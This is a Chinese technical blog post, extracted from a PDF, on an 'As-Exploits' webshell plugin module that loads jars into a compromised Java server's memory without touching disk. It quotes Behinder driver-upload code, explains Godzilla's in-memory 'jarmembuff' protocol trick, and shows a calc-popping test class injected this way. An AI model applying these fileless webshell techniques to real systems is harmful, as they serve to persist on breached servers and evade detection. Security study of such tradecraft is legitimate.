1
JarLoader模块的细节问题
前⾔
正⽂
冰蝎
哥斯拉
⼩实验
@yzddmr6
As-Exploits v 1.2 更新了⼀个JarLoader模块，可以在内存中直接加载⼀个jar，⽽⽂件不落地。今天来
讲⼀讲开发的细节。
打⼀个jar进去通常有两个⽤处：
⼀是可以⽤来上传数据库驱动。
⼆是把恶意类打⼊JVM中，后续只需要通过反射调⽤即可。哥斯拉的实现⽅式就是第⼀次就把所有的
payload打⼊jvm中，后续通过反射调⽤。所以后续通信的流量包都⾮常的⼩，只需要传递参数即可。
冰蝎跟哥斯拉都有类似的功能，研究了⼀下他们的实现。
冰蝎的加载jar功能内嵌于数据库连接部分，仅⽤于上传数据库驱动。⾸先把要打⼊的jdbc上传到⽬标的临
时⽬录，然后再⽤URLClassLoader去加载，这⾥贴⼀下代码。
net.rebeyond.behinder.ui.controller.DatabaseViewController#loadDriver
前⾔
正⽂
冰蝎
 1   private void loadDriver(String scriptType, String databaseType) 
throws Exception {
 2       String driverPath = "net/rebeyond/behinder/resource/drive
r/";
 3       Platform.runLater(() -> {
 4          this.statusLabel.setText("正在上传数据库驱动……");
 5       });
 6       String os = this.currentShellService.shellEntity.getString(
"os").toLowerCase();
2
 7       //根据系统型号选择临时⽬录
 8       String remoteDir = os.indexOf("windows") >= 0 ? "c:/window
s/temp/" : "/tmp/";
 9       String libName = null;
10       if (scriptType.equals("jsp")) { //根据类型选择数据库jdbc
11          if (databaseType.equals("sqlserver")) {
12             libName = "sqljdbc41.jar";
13          } else if (databaseType.equals("mysql")) {
14             libName = "mysql-connector-java-5.1.36.jar";
15          } else if (databaseType.equals("oracle")) {
16             libName = "ojdbc5.jar";
17          }
18       } else if (scriptType.equals("aspx")) {
19          if (databaseType.equals("mysql")) {
20             libName = "mysql.data.dll";
21          } else if (databaseType.equals("oracle")) {
22             libName = "Oracle.ManagedDataAccess.dll";
23          }
24       }
25
26       byte[] driverFileContent = Utils.getResourceData(driverPath 
+ libName);
27       String remotePath = remoteDir + libName;
28       //将jar先上传到临时⽬录
29       this.currentShellService.uploadFile(remotePath, driverFileC
ontent, true);
30       Platform.runLater(() -> {
31          this.statusLabel.setText("驱动上传成功，正在加载驱动……");
32       });
33       //将libPath传递给服务端加载
34       JSONObject loadRes = this.currentShellService.loadJar(remot
ePath);
35       if (loadRes.getString("status").equals("fail")) {
36          throw new Exception("驱动加载失败:" + loadRes.getString("m
sg"));
37       } else {
38          Platform.runLater(() -> {
39             if (scriptType.equals("jsp")) {
40                this.statusLabel.setText("驱动加载成功，请再次点击“连
接”。");
3
webshell获取到libPath然后⽤URLClassLoader去加载。
net.rebeyond.behinder.payload.java.Loader
哥斯拉的操作就⽐较秀了。因为打⼊⼀个jar不像打⼊⼀个class⼀样，直接有defineClass⽅法去接收⼀个
字节数组。打⼊jar需要使⽤URLClassLoader这个类，⼤概有两种⽅式，⼀种是利⽤http协议，远程获取
所要加载的jar。另⼀种是file协议，从本地路径去读取jar。据我的研究，没有直接接收⼀个jar的字节数组
的⽅法。
每次都额外搭⼀个http当然不⽅便，并且⽬标还不⼀定出⽹。但是file协议的话还需要把jar写到磁盘中，⽂
件就会落地，增加了被发现的⻛险。
但是我们回过头想，既然通过file协议加载jar，肯定会有⼀个通过路径找到⽂件，然后把⽂件读取到内存
的过程，如果我们能跳过这个根据路径找⽂件的过程，直接把⽂件的内容写到字节数组⾥不就可以⽂件不
落地了吗？
哥斯拉就是采⽤的这种做法，利⽤两个⼦类分别继承了URLStreamHandler跟URLConnection，然后利⽤
反射模拟了读取⽂件的过程。
创建了⼀种新的协议jarmembuff
41             }
42
43             this.statusLabel.setText("驱动加载成功。");
44          });
45       }
46    }
哥斯拉
4
然后把收到的jar⽂件的字节数组给放到变量⾥。
这样就实现了⽂件不落地，将jar打⼊内存的⽬的。
本⼈在As-Exploits⾥也采⽤了这种做法。
这⾥做⼀个⼩实验
写⼀个弹框测试类
⼩实验
 1 import java.io.IOException;
 2
 3 public class calc {
 4     public calc() {
 5         try {
 6             Runtime.getRuntime().exec("calc");
 7         } catch (IOException var2) {
 8             var2.printStackTrace();
 9         }
10
11     }
12 }
5
jar -cvf打包成jar
开个web项⽬，写⼀个test.jsp如下。去查找calc这个类并且实例化。如果实例化成功则会弹出我们的计算
器。
在第⼀次访问的时候找不到这个类肯定会报错
然后打开插件，选择要打⼊的jar⽂件。这⾥可以点按钮选择，也可以直接在输⼊框输⼊绝对路径。
1 
6
exploit！
再去刷新⻚⾯，弹出计算器。
7